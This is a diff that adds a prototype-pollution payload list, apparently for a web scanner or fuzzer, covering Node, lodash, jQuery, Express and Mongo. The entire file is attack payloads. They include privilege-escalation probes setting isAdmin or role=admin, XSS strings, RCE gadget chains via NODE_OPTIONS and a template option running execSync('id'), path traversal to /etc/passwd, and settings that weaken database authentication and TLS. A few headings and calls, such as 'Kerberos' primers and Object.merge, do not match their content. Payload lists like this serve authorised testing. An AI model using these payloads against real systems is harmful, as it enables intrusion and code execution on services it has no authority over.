@@ -1,0 +1,118 @@
+# category: prototype-pollution
+# description: Prototype pollution probes — client-side and server-side (Node, lodash, jQuery, Express body-parser).
+# references: HackTheBox PP writeups, PortSwigger Prototype Pollution labs, Snyk advisories.
+
+# ── Query-string / form patterns (reach server-side merges) ─────────────
+__proto__[polluted]=yes
+__proto__.polluted=yes
+constructor[prototype][polluted]=yes
+constructor.prototype.polluted=yes
+__proto__[toString]=1
+__proto__[isAdmin]=true
+__proto__[role]=admin
+__proto__[auth]=1
+__proto__[admin]=1
+constructor[prototype][admin]=1
+constructor[prototype][isAdmin]=true
+constructor[prototype][role]=admin
+
+# ── JSON body ────────────────────────────────────────────────────────────
+{"__proto__":{"polluted":true}}
+{"__proto__":{"isAdmin":true}}
+{"__proto__":{"role":"admin"}}
+{"__proto__":{"admin":true}}
+{"__proto__":{"toString":"pwn"}}
+{"constructor":{"prototype":{"polluted":true}}}
+{"constructor":{"prototype":{"isAdmin":true}}}
+{"a":{"__proto__":{"b":1}}}
+{"a":{"constructor":{"prototype":{"b":1}}}}
+
+# ── DOM / client-side sinks (location, innerHTML, Object merges) ────────
+__proto__[innerHTML]=<img src=x onerror=alert(1)>
+__proto__[src]=javascript:alert(1)
+__proto__[href]=javascript:alert(1)
+__proto__[background]=url("javascript:alert(1)")
+__proto__[outerHTML]=<script>alert(1)</script>
+__proto__[config][shell]=/bin/sh
+
+# ── Gadget chains (reach RCE via popular libs) ──────────────────────────
+__proto__[shell]=/bin/sh
+__proto__[env][NODE_OPTIONS]=--require /tmp/x.js
+__proto__[main]=/tmp/x.js
+__proto__[exports][shell]=/bin/sh
+__proto__[execArgv]=["--inspect-brk=0.0.0.0:9229"]
+__proto__[argv0]=/bin/sh
+__proto__[stdio]=inherit
+__proto__[cwd]=/tmp
+
+# ── jQuery $.extend / lodash _.merge triggers ───────────────────────────
+__proto__=1
+__proto__={}
+constructor[prototype]={}
+__proto__[__proto__]={}
+constructor.prototype.constructor.prototype.admin=1
+
+# ── Express body-parser `extended: true` / qs ───────────────────────────
+a[__proto__][b]=c
+a[constructor][prototype][b]=c
+a[__proto__][constructor][prototype][b]=c
+a[0][__proto__][b]=c
+
+# ── CL-like pollution of deep merge libraries ───────────────────────────
+{"__proto__":{"__proto__":{"polluted":true}}}
+{"a":{"__proto__":{"b":{"__proto__":{"c":1}}}}}
+{"__proto__":{"length":9999999}}
+
+# ── Kerberos / shell env primers (gadget-reachable) ──────────────────────
+__proto__[NODE_OPTIONS]=--require /tmp/x.js
+__proto__[env][NODE_OPTIONS]=--require /tmp/x.js
+__proto__[configurable]=false
+__proto__[writable]=false
+__proto__[enumerable]=true
+
+# ── Express-specific renderer pollution ─────────────────────────────────
+__proto__[outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');x
+__proto__[compile]=1
+__proto__[trusted]=true
+__proto__[view]={"name":"../../../etc/passwd","path":"/"}
+__proto__[root]=/etc
+
+# ── Mongo driver / mongoose ─────────────────────────────────────────────
+__proto__[allowDiskUse]=true
+__proto__[find]={}
+__proto__[authSource]=admin
+__proto__[authMechanism]=MONGODB-CR
+__proto__[tlsAllowInvalidCertificates]=true
+
+# ── Deserializer-reachable function names ───────────────────────────────
+__proto__[then]=foo
+__proto__[__defineGetter__]=foo
+__proto__[valueOf]=foo
+__proto__[hasOwnProperty]=foo
+__proto__[propertyIsEnumerable]=foo
+
+# ── Nested merge triggers (deeper) ──────────────────────────────────────
+a[0][__proto__][b]=1
+a[1][constructor][prototype][b]=1
+a[0][0][__proto__][b]=1
+{"a":{"b":{"__proto__":{"c":1}}}}
+{"__proto__":{"__proto__":{"__proto__":{"polluted":true}}}}
+
+# ── GET-param based (reach server-side qs.parse with extended:true) ─────
+?__proto__[polluted]=yes
+?__proto__.polluted=yes
+?constructor[prototype][polluted]=yes
+?a.b.c.__proto__.d=1
+?a[b][__proto__][c]=1
+?__proto__%5bpolluted%5d=yes
+?__proto__%2epolluted=yes
+
+# ── Client-side DOM / Object.assign ─────────────────────────────────────
+Object.assign({},JSON.parse('{"__proto__":{"polluted":true}}'))
+Object.merge({},JSON.parse('{"__proto__":{"isAdmin":true}}'))
+_.merge({},{"__proto__":{"polluted":true}})
+_.defaultsDeep({},{"__proto__":{"polluted":true}})
+_.set({},"__proto__.polluted","yes")
+_.set({},"constructor.prototype.polluted","yes")
+_.setWith({},"__proto__[polluted]","yes",Object)
+_.zipObjectDeep(["__proto__.polluted"],[true])
